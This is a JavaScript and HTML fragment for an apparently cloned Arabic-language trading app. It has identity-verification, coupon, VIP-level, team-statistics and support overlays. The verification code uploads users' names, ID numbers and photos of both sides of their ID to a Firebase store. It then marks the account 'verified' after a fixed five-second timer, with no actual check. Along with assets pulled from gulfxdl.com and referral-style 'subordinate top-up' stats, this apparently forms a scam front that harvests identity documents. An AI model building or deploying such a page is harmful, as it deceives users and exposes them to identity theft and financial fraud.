<label class="up" id="uB"><input type="file" accept="image/*" onchange="prev(this,'bImg')"><div class="fr"><span class="c c1"></span><span class="c c2"></span><span class="c c3"></span><span class="c c4"></span><img id="bImg" src="https://gulfxdl.com/assets/idImg2-light-D2XNgiST.png"></div><p>يرجى رفع صورة بطاقة الهوية من الوجه الخلفي</p></label>
<button class="btn" id="sB" onclick="sub()">إرسال</button>
<div class="ov" id="cOv" onclick="closeSh('cOv')"><div class="sh" onclick="event.stopPropagation()"><div class="hd2"><span>يرجى اختيار الجنسية</span><span class="x" onclick="closeSh('cOv')"><svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div><input class="sr" id="cSr" placeholder="بحث..." oninput="render()"><div id="cList"></div></div></div>
<div class="ov" id="dOv" onclick="closeSh('dOv')"><div class="sh" onclick="event.stopPropagation()"><div class="hd2"><span>يرجى اختيار نوع الوثيقة</span><span class="x" onclick="closeSh('dOv')"><svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.8" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg></span></div><div id="dList"></div></div></div>
`;

function injectVerifyOverlay(){
  var vo=document.createElement('div');
  vo.id='verifyOverlay';
  vo.innerHTML=verifyHtml;
  document.body.appendChild(vo);
  initVerify();
}

async function initVerify(){
const {initializeApp}=await import("https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js");
const {getAuth,onAuthStateChanged,signInWithEmailAndPassword,createUserWithEmailAndPassword}=await import("https://www.gstatic.com/firebasejs/12.18.0/firebase-auth.js");
const {getFirestore,doc,setDoc,getDoc,onSnapshot}=await import("https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js");
const {getStorage,ref,uploadString,getDownloadURL}=await import("https://www.gstatic.com/firebasejs/12.18.0/firebase-storage.js");
const app=initializeApp({apiKey:"AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",authDomain:"hhhxh-5ebe4.firebaseapp.com",projectId:"hhhxh-5ebe4",storageBucket:"hhhxh-5ebe4.firebasestorage.app",messagingSenderId:"79243000696",appId:"1:79243000696:web:ee0fb2d2ccce791954e68d",measurementId:"G-08BR6LN6PT"});
const auth=getAuth(app),db=getFirestore(app),st=getStorage(app);
window.Cs=["Afghanistan","Albania","Algeria","Andorra","Angola","Antigua and Barbuda","Argentina","Armenia","Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Barbados","Belarus","Belgium","Belize","Benin","Bhutan","Bolivia","Bosnia and Herzegovina","Botswana","Brazil","Brunei","Bulgaria","Burkina Faso","Burundi","Cabo Verde","Cambodia","Cameroon","Canada","Central African Republic","Chad","Chile","China","Colombia","Comoros","Congo","Costa Rica","Croatia","Cuba","Cyprus","Czech Republic","Denmark","Djibouti","Dominica","Dominican Republic","DR Congo","Ecuador","Egypt","El Salvador","Equatorial Guinea","Eritrea","Estonia","Eswatini","Ethiopia","Fiji","Finland","France","Gabon","Gambia","Georgia","Germany","Ghana","Greece","Grenada","Guatemala","Guinea","Guinea-Bissau","Guyana","Haiti","Honduras","Hungary","Iceland","India","Indonesia","Iran","Iraq","Ireland","Israel","Italy","Ivory Coast","Jamaica","Japan","Jordan","Kazakhstan","Kenya","Kiribati","Kuwait","Kyrgyzstan","Laos","Latvia","Lebanon","Lesotho","Liberia","Libya","Liechtenstein","Lithuania","Luxembourg","Madagascar","Malawi","Malaysia","Maldives","Mali","Malta","Marshall Islands","Mauritania","Mauritius","Mexico","Micronesia","Moldova","Monaco","Mongolia","Montenegro","Morocco","Mozambique","Myanmar","Namibia","Nauru","Nepal","Netherlands","New Zealand","Nicaragua","Niger","Nigeria","North Korea","North Macedonia","Norway","Oman","Pakistan","Palau","Palestine","Panama","Papua New Guinea","Paraguay","Peru","Philippines","Poland","Portugal","Qatar","Romania","Russia","Rwanda","Saint Kitts and Nevis","Saint Lucia","Saint Vincent and the Grenadines","Samoa","San Marino","Sao Tome and Principe","Saudi Arabia","Senegal","Serbia","Seychelles","Sierra Leone","Singapore","Slovakia","Slovenia","Solomon Islands","Somalia","South Africa","South Korea","South Sudan","Spain","Sri Lanka","Sudan","Suriname","Sweden","Switzerland","Syria","Taiwan","Tajikistan","Tanzania","Thailand","Timor-Leste","Togo","Tonga","Trinidad and Tobago","Tunisia","Turkey","Turkmenistan","Tuvalu","Uganda","Ukraine","United Arab Emirates","United Kingdom","United States","Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe"];
window.Ds=["بطاقة الهوية","جواز السفر","رخصة القيادة"];window.cSel=Cs.indexOf("United States");window.dSel=-1;window.fD="";window.bD="";window.lock=false;window.uid=null;window.subd=false;
const CK='<span class="ck"><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12l5 5L20 6"/></svg></span>';
window.render=function(){var q=(document.getElementById('cSr').value||'').toLowerCase(),h='';Cs.forEach(function(c,i){if(!q||c.toLowerCase().includes(q))h+='<div class="opt'+(i==cSel?' sel':'')+'" onclick="pickC('+i+')"><span>'+c+'</span>'+(i==cSel?CK:'')+'</div>'});document.getElementById('cList').innerHTML=h;
var h2='';Ds.forEach(function(d,i){h2+='<div class="opt'+(i==dSel?' sel':'')+'" onclick="pickD('+i+')"><span>'+d+'</span>'+(i==dSel?CK:'')+'</div>'});document.getElementById('dList').innerHTML=h2};
window.openSh=function(id){if(lock)return;document.getElementById(id).classList.add('on')};
window.closeSh=function(id){document.getElementById(id).classList.remove('on')};
window.pickC=function(i){cSel=i;document.getElementById('cVal').textContent=Cs[i];render();closeSh('cOv');saveDraft()};
window.pickD=function(i){dSel=i;document.getElementById('dVal').textContent=Ds[i];document.getElementById('dVal').style.color='#1c1c22';render();closeSh('dOv');saveDraft()};
window.prev=function(inp,img){if(lock){inp.value='';return}if(inp.files&&inp.files[0]){var r=new FileReader();r.onload=function(e){document.getElementById(img).src=e.target.result;if(img=='fImg')fD=e.target.result;else bD=e.target.result;saveDraft()};r.readAsDataURL(inp.files[0])}};
function showSb(msg,ok){var s=document.getElementById('sb');s.textContent=msg;s.classList.add('on');if(ok)s.classList.add('ok');else s.classList.remove('ok')}
function lockUI(v){lock=v;document.getElementById('nm').disabled=v;document.getElementById('idn').disabled=v;document.getElementById('sB').disabled=v;document.getElementById('uF').classList.toggle('dis',v);document.getElementById('uB').classList.toggle('dis',v);document.getElementById('rC').style.pointerEvents=v?'none':'';document.getElementById('rD').style.pointerEvents=v?'none':''}
function saveDraft(){if(subd||!uid)return;try{localStorage.setItem('vd_'+uid,JSON.stringify({country:Cs[cSel],name:document.getElementById('nm').value,docType:dSel>=0?Ds[dSel]:'',idNumber:document.getElementById('idn').value,fD:fD,bD:bD}))}catch(e){}}
function loadDraft(){if(!uid)return;try{var s=localStorage.getItem('vd_'+uid);if(s){var d=JSON.parse(s);fillData(d);if(d.fD){fD=d.fD;document.getElementById('fImg').src=d.fD}if(d.bD){bD=d.bD;document.getElementById('bImg').src=d.bD}}}catch(e){}}
function fillData(d){if(d.name!=null)document.getElementById('nm').value=d.name||'';if(d.idNumber!=null)document.getElementById('idn').value=d.idNumber||'';if(d.country){var i=Cs.indexOf(d.country);if(i>=0){cSel=i;document.getElementById('cVal').textContent=d.country}}if(d.docType){var j=Ds.indexOf(d.docType);if(j>=0){dSel=j;document.getElementById('dVal').textContent=d.docType;document.getElementById('dVal').style.color='#1c1c22'}}if(d.frontUrl)document.getElementById('fImg').src=d.frontUrl;if(d.backUrl)document.getElementById('bImg').src=d.backUrl}
document.addEventListener('input',function(e){if(e.target.id=='nm'||e.target.id=='idn')saveDraft()});
window.sub=async function(){if(lock)return;var n=document.getElementById('nm').value.trim(),d=document.getElementById('idn').value.trim();
if(!n)return alert('يرجى إدخال الاسم');if(dSel<0)return alert('يرجى اختيار نوع الوثيقة');if(!d)return alert('يرجى إدخال رقم بطاقة الهوية');if(!fD&&!document.getElementById('fImg').src.startsWith('http'))return alert('يرجى رفع صورة الوجه الأمامي');if(!bD&&!document.getElementById('bImg').src.startsWith('http'))return alert('يرجى رفع صورة الوجه الخلفي');
subd=true;lockUI(true);showSb('جاري تحقق من الهوية يرجي الإنتظار',false);
try{var fU='',bU='';if(fD){var fr=ref(st,'ids/'+uid+'/front.jpg');await uploadString(fr,fD,'data_url');fU=await getDownloadURL(fr)}if(bD){var br=ref(st,'ids/'+uid+'/back.jpg');await uploadString(br,bD,'data_url');bU=await getDownloadURL(br)}
await setDoc(doc(db,'verifications',uid),{uid:uid,country:Cs[cSel],name:n,docType:Ds[dSel],idNumber:d,frontUrl:fU,backUrl:bU,status:'pending',createdAt:Date.now()});
setTimeout(async function(){await setDoc(doc(db,'verifications',uid),{status:'verified',verifiedAt:Date.now()},{merge:true});showSb('نجح التحقق من حسابك',true)},5000)}catch(e){alert('خطأ: '+e.message);subd=false;lockUI(false);document.getElementById('sb').classList.remove('on','ok')}};
var isLogin=true;
window.tog=function(){isLogin=!isLogin;document.getElementById('aT').textContent=isLogin?'تسجيل الدخول':'إنشاء حساب';document.getElementById('aB').textContent=isLogin?'دخول':'إنشاء';document.getElementById('aS').textContent=isLogin?'ليس لديك حساب؟ إنشاء حساب':'لديك حساب؟ تسجيل الدخول';document.getElementById('aE').textContent=''};
window.doAuth=async function(){var e=document.getElementById('aEm').value.trim(),p=document.getElementById('aPw').value;document.getElementById('aE').textContent='';if(!e||!p){document.getElementById('aE').textContent='الرجاء إدخال البريد وكلمة السر';return}try{if(isLogin)await signInWithEmailAndPassword(auth,e,p);else await createUserWithEmailAndPassword(auth,e,p)}catch(er){document.getElementById('aE').textContent=er.message}};
onAuthStateChanged(auth,async function(u){if(u&&u.email&&!u.isAnonymous){uid=u.uid;document.getElementById('au').classList.remove('on');try{var s=await getDoc(doc(db,'verifications',uid));if(s.exists()){var dt=s.data();subd=true;fillData(dt);if(dt.status==='pending'){lockUI(true);showSb('جاري تحقق من الهوية يرجي الإنتظار',false)}else if(dt.status==='verified'){lockUI(true);showSb('نجح التحقق من حسابك',true)}}else{loadDraft()}onSnapshot(doc(db,'verifications',uid),function(s){if(s.exists()){var dt=s.data();subd=true;fillData(dt);if(dt.status==='pending'){lockUI(true);showSb('جاري تحقق من الهوية يرجي الإنتظار',false)}else if(dt.status==='verified'){lockUI(true);showSb('نجح التحقق من حسابك',true)}}})}catch(e){loadDraft()}}else{document.getElementById('au').classList.add('on')}});
render();
setTimeout(function(){document.getElementById('lg').style.display='none'},500);
}

// Identity verification: حقن قسم التوثيق عند أول ضغطة (نفس نظام الحقن الأصلي)
var acVerifyScriptLoaded=false;
document.getElementById('acVerify').addEventListener('click',function(){
  if(document.getElementById('verifyOverlay')){document.getElementById('verifyOverlay').style.display='block';return;}
  if(acVerifyScriptLoaded){return;}
  acVerifyScriptLoaded=true;
  injectVerifyOverlay();
});

// Settings click
document.getElementById('acSettings').addEventListener('click',function(){
  this.style.transform='scale(.9)';setTimeout(function(){document.getElementById('acSettings').style.transform='';},150);
});

// ============================================================
// صفحة القسيمة (couponOverlay): حقن ديناميكي بنفس نظام التوثيق
// نسخة حرفية من الصورة المرجعية — اتجاه LTR أجنبي بالكامل
// شاشة تحميل مطابقة لقسم التوثيق ونفس المدة (500ms)
// زر الرجوع فعّال: يقفل صفحة القسيمة ويرجع المستخدم خطوة للوراء (صفحة الحساب)
// ============================================================

// زرار الرجوع في صفحة القسيمة: يقفل الـ Overlay ويرجع للبروفايل
window.closeCoupon=function(){var co=document.getElementById('couponOverlay');if(co)co.style.display='none';};

var couponHtml=`
<div class="cp-lg" id="cpLg"><img src="https://gulfxdl.com/assets/loading-D0BtznxM.gif"></div>
<div class="cp-hd"><span class="cp-bk" onclick="closeCoupon()"><svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg></span><div class="cp-t">قسيمة</div></div>
<div class="cp-tabs">
  <div class="cp-tab on">قسيمة خصم متابعة الصفقات</div>
  <div class="cp-tab">قسيمة خصم الاستثمار التلقائي</div>
  <div class="cp-tab">رصيد السحب</div>
</div>
<div class="cp-body">
  <img class="cp-empty" src="https://gulfxdl.com/assets/empty-light-B1A8k_0V.png" alt="لا يوجد محتوى">
  <div class="cp-empty-tx">لا يوجد محتوى</div>
</div>
`;

// شاشة التحميل: تظهر عند كل فتح للصفحة وتختفي بعد 500ms (نفس مدة قسم التوثيق)
function showCouponLoading(){
  var lg=document.getElementById('cpLg');
  if(!lg)return;
  lg.style.display='flex';
  setTimeout(function(){lg.style.display='none';},500);
}

function injectCouponOverlay(){
  var co=document.createElement('div');
  co.id='couponOverlay';
  co.innerHTML=couponHtml;
  document.body.appendChild(co);
  // تبديل التبويبات: تفعيل التبويب المضغوط مع تمريره للمنتصف
  document.querySelectorAll('#couponOverlay .cp-tab').forEach(function(t){
    t.addEventListener('click',function(){
      document.querySelectorAll('#couponOverlay .cp-tab').forEach(function(x){x.classList.remove('on');});
      t.classList.add('on');
      if(t.scrollIntoView){t.scrollIntoView({inline:'center',block:'nearest'});}
    });
  });
}

// قسيمة: حقن الصفحة عند أول ضغطة، وأي ضغطة بعدها تعرضها فقط مع شاشة التحميل
var acCouponScriptLoaded=false;
document.getElementById('acCoupon').addEventListener('click',function(){
  if(document.getElementById('couponOverlay')){document.getElementById('couponOverlay').style.display='flex';showCouponLoading();return;}
  if(acCouponScriptLoaded){return;}
  acCouponScriptLoaded=true;
  injectCouponOverlay();
  showCouponLoading();
});

// ============================================================
// صفحة مستواي (levelOverlay): نفس تصميم ملف mstea.html حرفيًا
// حقن ديناميكي بنفس نظام التوثيق والقسيمة
// شاشة تحميل مطابقة ونفس المدة (500ms)
// زر الرجوع فعّال: يقفل الصفحة ويرجع المستخدم للبروفايل
// ============================================================

// زرار الرجوع في صفحة مستواي: يقفل الـ Overlay ويرجع للبروفايل
window.closeLevel=function(){var lo=document.getElementById('levelOverlay');if(lo)lo.style.display='none';};

var levelHtml=`
<div class="lv-lg" id="lvLg"><img src="https://gulfxdl.com/assets/loading-D0BtznxM.gif"></div>
<div class="hdr"><span class="bk" onclick="closeLevel()">&#10094;</span><h1>My Level</h1></div>
<div class="wrap"><div class="card"><div class="badge">Current Level</div><div class="vip">VIP 0</div><div class="stars"><svg viewBox="0 0 24 24"><path d="M12 2l3 6.5 7 .8-5.2 4.7 1.5 7-6.3-3.7L5.7 21l1.5-7L2 9.3l7-.8z"/></svg><svg viewBox="0 0 24 24"><path d="M12 2l3 6.5 7 .8-5.2 4.7 1.5 7-6.3-3.7L5.7 21l1.5-7L2 9.3l7-.8z"/></svg><svg viewBox="0 0 24 24"><path d="M12 2l3 6.5 7 .8-5.2 4.7 1.5 7-6.3-3.7L5.7 21l1.5-7L2 9.3l7-.8z"/></svg><svg viewBox="0 0 24 24"><path d="M12 2l3 6.5 7 .8-5.2 4.7 1.5 7-6.3-3.7L5.7 21l1.5-7L2 9.3l7-.8z"/></svg><svg viewBox="0 0 24 24"><path d="M12 2l3 6.5 7 .8-5.2 4.7 1.5 7-6.3-3.7L5.7 21l1.5-7L2 9.3l7-.8z"/></svg></div><div class="clevel"><i></i>Copy Level</div></div><div class="panel"><div class="phead"><b>Team Statistics</b><span class="ref"><svg viewBox="0 0 24 24"><path d="M21 12a9 9 0 11-2.6-6.4M21 3v6h-6"/></svg>Refresh</span></div><div class="rows"><div class="item"><div class="ic"><svg viewBox="0 0 24 24"><circle cx="10" cy="8" r="3.5"/><path d="M4 20c0-3.3 2.7-6 6-6s6 2.7 6 6M17 8h4M19 6v4"/></svg></div><span>Active Team Members <em>&#8594;</em></span></div><div class="item"><div class="ic"><svg viewBox="0 0 24 24"><circle cx="9" cy="8" r="3.5"/><path d="M3 20c0-3.3 2.7-6 6-6s6 2.7 6 6"/><path d="M16 6.5l1.2 1.2 2.3-2.4" stroke-width="2"/></svg></div><span>Active Direct Members <em>&#8594;</em></span></div></div><div class="note"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 11v5M12 8v.1"/></svg><span>This statistic shows your team members who meet the automatic upgrade requirements for your current Copy Level.</span></div></div></div>
`;

// شاشة التحميل: تظهر عند كل فتح للصفحة وتختفي بعد 500ms (نفس مدة قسم التوثيق)
function showLevelLoading(){
  var lg=document.getElementById('lvLg');
  if(!lg)return;
  lg.style.display='flex';
  setTimeout(function(){lg.style.display='none';},500);
}

function injectLevelOverlay(){
  var lo=document.createElement('div');
  lo.id='levelOverlay';
  lo.innerHTML=levelHtml;
  document.body.appendChild(lo);
}

// مستواي: حقن الصفحة عند أول ضغطة، وأي ضغطة بعدها تعرضها فقط مع شاشة التحميل
var acLevelScriptLoaded=false;
document.getElementById('acLevel').addEventListener('click',function(){
  if(document.getElementById('levelOverlay')){document.getElementById('levelOverlay').style.display='block';showLevelLoading();return;}
  if(acLevelScriptLoaded){return;}
  acLevelScriptLoaded=true;
  injectLevelOverlay();
  showLevelLoading();
});

// ============================================================
// صفحة إحصائيات النشاط (statsOverlay): نفس تصميم ملف ahsahiat.html حرفيًا
// حقن ديناميكي بنفس نظام التوثيق والقسيمة
// شاشة تحميل مطابقة ونفس المدة (500ms)
// زر الرجوع فعّال: يقفل الصفحة ويرجع المستخدم للبروفايل
// ============================================================

// زرار الرجوع في صفحة الإحصائيات: يقفل الـ Overlay ويرجع للبروفايل
window.closeStats=function(){var so=document.getElementById('statsOverlay');if(so)so.style.display='none';};

var statsHtml=`
<div class="st-lg" id="stLg"><img src="https://gulfxdl.com/assets/loading-D0BtznxM.gif"></div>
<div class="hd"><span class="bk" onclick="closeStats()">&#8249;</span><h1>Activity Statistics</h1></div>
<div class="wrap"><p class="tz">Filter by timezone UTC+3</p><div class="note">Eligibility requirement: Total top-up of new direct subordinates within the specified period &le; USD 1000</div><p class="lbl">Custom Range</p><div class="card"><div class="row"><span class="k">Start Time</span><span class="v">2026-05-25 00:00:00 <i class="chv">&#8250;</i></span></div><div class="row"><span class="k">End Time</span><span class="v">2026-06-04 00:00:00 <i class="chv">&#8250;</i></span></div></div><button class="btn">Query</button><div class="card"><p class="lbl" style="padding:18px 18px 0;margin:0">Qualified Direct Subordinates</p><div class="cnt"><b>0</b><span>People</span></div><div class="info" style="border-top:1px solid #f2f2f7"><div class="r"><span class="k">Total Qualified Top-up</span><span class="v">1000 USD</span></div><div class="r"><span class="k">Time Range</span></div><div class="rng">2026-05-25 00:00:00 ~ 2026-06-04 00:00:00</div></div></div></div>
`;

// شاشة التحميل: تظهر عند كل فتح للصفحة وتختفي بعد 500ms (نفس مدة قسم التوثيق)
function showStatsLoading(){
  var lg=document.getElementById('stLg');
  if(!lg)return;
  lg.style.display='flex';
  setTimeout(function(){lg.style.display='none';},500);
}

function injectStatsOverlay(){
  var so=document.createElement('div');
  so.id='statsOverlay';
  so.innerHTML=statsHtml;
  document.body.appendChild(so);
}

// إحصائيات النشاط: حقن الصفحة عند أول ضغطة، وأي ضغطة بعدها تعرضها فقط مع شاشة التحميل
var acStatsScriptLoaded=false;
document.getElementById('acStats').addEventListener('click',function(){
  if(document.getElementById('statsOverlay')){document.getElementById('statsOverlay').style.display='block';showStatsLoading();return;}
  if(acStatsScriptLoaded){return;}
  acStatsScriptLoaded=true;
  injectStatsOverlay();
  showStatsLoading();
});

// ============================================================
// مركز خدمة العملاء: تحميل ملف support.js بنفس نظام باقي الأقسام
// شاشة تحميل مطابقة ونفس المدة (500ms)
// زر الرجوع الخاص بصفحة الدعم يعمل كما هو بدون أي تعديل على الملف
// ============================================================

// شاشة تحميل الدعم: عنصر مستقل بنفس شكل شاشة تحميل التوثيق والقسيمة
var supLgEl=document.createElement('div');
supLgEl.id='supLg';
supLgEl.innerHTML='<img src="https://gulfxdl.com/assets/loading-D0BtznxM.gif">';
document.body.appendChild(supLgEl);

// شاشة التحميل: تظهر عند كل فتح للصفحة وتختفي بعد 500ms (نفس مدة قسم التوثيق)
function showSupportLoading(){
  var lg=document.getElementById('supLg');
  if(!lg)return;
  lg.style.display='flex';
  setTimeout(function(){lg.style.display='none';},500);
}

// خدمة العملاء: تحميل ملف support.js عند أول ضغطة وبعد كل رجوع (الملف يحذف نفسه عند الرجوع)
document.getElementById('acSupport').addEventListener('click',function(){
  showSupportLoading();
  if(document.getElementById('supPage')){return;}
  // عند إعادة الفتح بعد الرجوع: Firebase متهيأ من قبل، فنستخدم نفس التطبيق الموجود بدون المساس بملف support.js
  if(window.firebase&&window.firebase.apps&&window.firebase.apps.length){
    window.firebase.initializeApp=function(){return window.firebase.app();};
  }
  var s=document.createElement('script');
  s.src=GH+'support.js';
  document.body.appendChild(s);
});

})();
